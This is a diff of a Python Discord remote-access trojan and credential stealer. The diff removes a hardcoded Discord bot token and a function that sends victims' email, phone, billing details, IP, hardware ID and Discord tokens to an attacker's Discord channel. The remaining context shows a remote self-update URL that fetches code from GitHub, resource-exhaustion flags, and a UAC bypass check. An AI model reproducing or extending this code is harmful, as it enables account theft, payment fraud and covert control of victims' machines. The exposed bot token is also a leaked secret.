@@ -80,11 +80,10 @@ tokens = []
 SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/system.py"
 CURRENT_VERSION = "1.0.0"
 UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
-DISCORD_BOT_TOKEN = "MTMzNTExNTU1ODYzODcxOTA4OA.G_aN-A.iQksq1qD0MVPcVdhDljhJ2-1m9nIkh1E-AyyE0"
 COMMAND_PREFIX = "!"
 intents = discord.Intents.default()
 intents.message_content = True
-bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
+
 connected_clients = {}
 ram_eater_active = False
 bandwidth_eater_active = False
@@ -278,48 +277,6 @@ def try_extract(func):
         return wrapper
 
 
-
-async def send_embed(email, phone, nitro, billing, ip, pc_username, pc_name, platform, user_path_name, hwid, token, tokens, username, user_id):
-    embed = discord.Embed(
-        color=0x7289da,
-        title="Republic of Wadiya Intelligence Report",
-        description="Details about the moga's account and system."
-    )
-
-
-    embed.add_field(
-        name="|Account Info|",
-        value=f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-        inline=True
-    )
-    embed.add_field(
-        name="|PC Info|",
-        value=f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}\nUser Path: {user_path_name}',
-        inline=True
-    )
-    embed.add_field(
-        name="|More Info|",
-        value=f"HWID: {hwid}\nToken: {token}",
-        inline=False
-    )
-    embed.add_field(
-        name="**Tokens:**",
-        value=f"```yaml\n{tokens if tokens else 'No tokens extracted'}\n```",
-        inline=False
-    )
-
-    embed.set_author(
-        name=username,
-        icon_url=f"https://cdn.discordapp.com/avatars/{user_id}.png?size=32"
-    )
-    embed.set_footer(text="Zitemaker")
-
-
-    channel = bot.get_channel(1335115941444587614)
-    await channel.send(embed=embed)                            
-
-async def start_bot():
-    await bot.start(DISCORD_BOT_TOKEN)
 
 
 if cc.get_uac_bypass():
